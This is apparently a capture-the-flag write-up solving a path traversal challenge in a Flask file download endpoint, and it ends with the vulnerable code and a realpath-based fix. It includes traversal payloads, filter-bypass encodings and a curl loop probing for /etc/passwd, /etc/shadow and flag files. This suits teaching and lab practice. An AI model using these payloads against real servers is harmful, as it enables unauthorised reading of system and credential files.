---
title: "Web - Path Traversal"
description: "Exploiting a directory traversal vulnerability in a file download endpoint to read the flag from the server."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Easy               |
| Points     | 100                |
| Flag       | `zemi{d0t_d0t_sl4sh_t0_v1ct0ry}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-path-traversal/app.py)
- [documents/guide.pdf](/Website/challenges/web-path-traversal/documents/guide.pdf)
- [flag.txt](/Website/challenges/web-path-traversal/flag.txt)
- [README.md](/Website/challenges/web-path-traversal/README.md)
- [requirements.txt](/Website/challenges/web-path-traversal/requirements.txt)

## Reconnaissance

The challenge presents a documentation site at `http://challenge.ctf.local:5000`. There are several pages with download links for PDF files. Clicking one produces a URL like:

```
http://challenge.ctf.local:5000/download?file=guide.pdf
```

The `file` parameter immediately catches our attention. If the server doesn't sanitize this, we might be able to read arbitrary files.

## Testing for Path Traversal

Let's try reading `/etc/passwd`:

```
http://challenge.ctf.local:5000/download?file=../../../etc/passwd
```

Response:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

We have directory traversal. The server is blindly opening whatever path we provide.

## Finding the Flag

CTF flags are commonly placed in:
- `/flag.txt`
- `/home/ctf/flag.txt`
- The application's working directory
- Environment variables

Let's try the most common location:

```
/download?file=../../../flag.txt
```

```
zemi{d0t_d0t_sl4sh_t0_v1ct0ry}
```

Got it on the first try.

## What if Basic Traversal is Blocked?

Some applications try to filter `../` but do it poorly. Common bypasses:

```bash
# Double encoding
%252e%252e%252f  →  ../

# URL encoding
..%2f  →  ../

# Backslash (Windows)
..\

# Null byte (older PHP)
../../../etc/passwd%00.pdf

# Double dot bypass
....//....//....//etc/passwd

# Using absolute path
/download?file=/etc/passwd
```

## Automation with curl

```bash
# Quick test for common files
for path in "/flag.txt" "/home/ctf/flag.txt" "/app/flag.txt" "/etc/shadow"; do
    echo "=== Testing: $path ==="
    curl -s "http://challenge.ctf.local:5000/download?file=../../../$path"
    echo
done
```

## Understanding the Vulnerable Code

The backend likely looks something like this (Python Flask):

```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    filepath = os.path.join('/app/documents', filename)  # No sanitization!
    return send_file(filepath)
```

The fix:

```python
import os

@app.route('/download')
def download():
    filename = request.args.get('file')
    # Resolve the full path and ensure it stays within the documents directory
    base_dir = os.path.realpath('/app/documents')
    filepath = os.path.realpath(os.path.join(base_dir, filename))

    if not filepath.startswith(base_dir):
        abort(403)

    return send_file(filepath)
```

## Tools Used

- Browser / curl
- URL encoder for bypass attempts

## Lessons Learned

- Never use user input directly in file paths
- Always resolve the canonical path and verify it stays within the allowed directory
- Simple string filtering (`../` removal) is easily bypassed
- Use `os.path.realpath()` or equivalent to resolve symlinks and relative paths
- Web frameworks often provide safe file-serving utilities — use them
